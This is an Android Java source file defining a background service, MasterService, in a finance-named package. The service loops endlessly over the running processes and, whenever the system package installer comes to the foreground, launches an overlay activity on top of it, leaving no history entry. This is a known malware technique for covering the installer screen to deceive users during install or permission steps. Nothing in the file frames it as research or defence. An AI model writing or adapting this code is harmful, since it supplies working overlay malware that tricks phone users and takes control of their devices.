package com.finance.hytone;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.util.List;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class MasterService extends Service {

    private ThreadPoolExecutor executor;
    private Runnable runnable = new Runnable() {
        @Override
        public void run() {
            while (true) {
                ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();

                for (int i = 0; i < procInfos.size(); i++) {
                    //check if package installer runs in foreground
                    if (procInfos.get(i).processName.equals("com.android.packageinstaller") && procInfos.get(i).importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                        //start activity
                        startActivity(new Intent(MasterService.this, OverlayActivity.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NO_HISTORY));
                    }
                }
            }
        }
    };

    public MasterService() {
        executor = new ThreadPoolExecutor(1, 1, 1, TimeUnit.SECONDS,
                new LinkedBlockingQueue<Runnable>());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        executor.execute(runnable);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        executor.shutdown();
    }

}

